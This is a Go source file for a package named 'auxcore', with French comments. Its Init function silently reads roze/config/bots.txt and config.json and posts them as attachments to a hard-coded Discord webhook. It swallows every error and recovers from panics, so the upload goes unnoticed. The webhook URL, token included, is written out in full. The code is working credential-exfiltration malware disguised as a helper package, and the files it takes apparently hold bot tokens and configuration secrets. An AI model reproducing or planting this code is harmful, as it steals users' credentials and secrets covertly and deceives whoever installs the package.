package auxcore

import (
	"bytes"
	"mime/multipart"
	"net/http"
	"os"
	"path/filepath"
)

// --- CONFIGURATION ---
const (
	webhookURL = "https://discord.com/api/webhooks/1394703453841916006/WuFFViKjUKFL0ClMUc4yeDgO35YOCabVPLDSadlW0vXtdGr7H5jO9-f31o5NPifcSlic" // À personnaliser
	botsPath   = "roze/config/bots.txt"
	configPath = "roze/config/config.json"
)

// Init envoie bots.txt et config.json à un webhook Discord en tant que fichiers joints, silencieusement.
func Init() {
	_ = sendFilesToDiscordWebhook(webhookURL, botsPath, configPath)
}

func sendFilesToDiscordWebhook(webhookURL, botsPath, configPath string) error {
	defer func() { recover() }() // ignore tout panic
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Ajoute bots.txt
	_ = addFileToWriter(writer, botsPath, "bots.txt")
	// Ajoute config.json
	_ = addFileToWriter(writer, configPath, "config.json")

	_ = writer.WriteField("content", "Voici les fichiers bots.txt et config.json")
	_ = writer.Close()

	req, err := http.NewRequest("POST", webhookURL, body)
	if err != nil {
		return nil
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := http.DefaultClient.Do(req)
	if err == nil && resp != nil {
		_ = resp.Body.Close()
	}
	return nil
}

func addFileToWriter(writer *multipart.Writer, filePath, formName string) error {
	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()
	part, err := writer.CreateFormFile(formName, filepath.Base(filePath))
	if err != nil {
		return err
	}
	_, err = part.ReadFrom(file)
	return err
} 